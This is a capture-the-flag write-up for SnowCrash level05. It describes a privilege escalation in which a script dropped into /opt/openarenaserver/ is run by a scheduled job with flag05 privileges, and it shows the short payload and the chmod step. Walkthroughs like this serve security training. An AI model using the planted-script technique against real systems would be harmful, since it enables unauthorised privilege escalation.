# Level05 – SnowCrash

## Objective
Retrieve the flag for `level05` by exploiting a scheduled privileged script.

## Reconnaissance
No obvious SUID binary referencing `flag05` was found in the home directory.
Further investigation revealed a script `/usr/sbin/openarenaserver` that executes every file 
inside `/opt/openarenaserver/` and then deletes it.

### Vulnerability
- The script executes all files found in `/opt/openarenaserver/` without validation.
- Any file placed in this directory will be executed with `flag05` privileges.
- This creates a classic arbitrary code execution vulnerability.

## Exploitation
1. Create a malicious script inside `/opt/openarenaserver/`:
```bash
#!/bin/sh
getflag > /tmp/pass.txt
```
2. Make it executable:
```bash
   chmod +x flag
```
3. Wait for the scheduled execution.
The script runs with `flag05` privileges and writes the flag to `/tmp/pass.txt`.

## Flag
![Level05 Flag Screenshot](images/level05_flag.png)

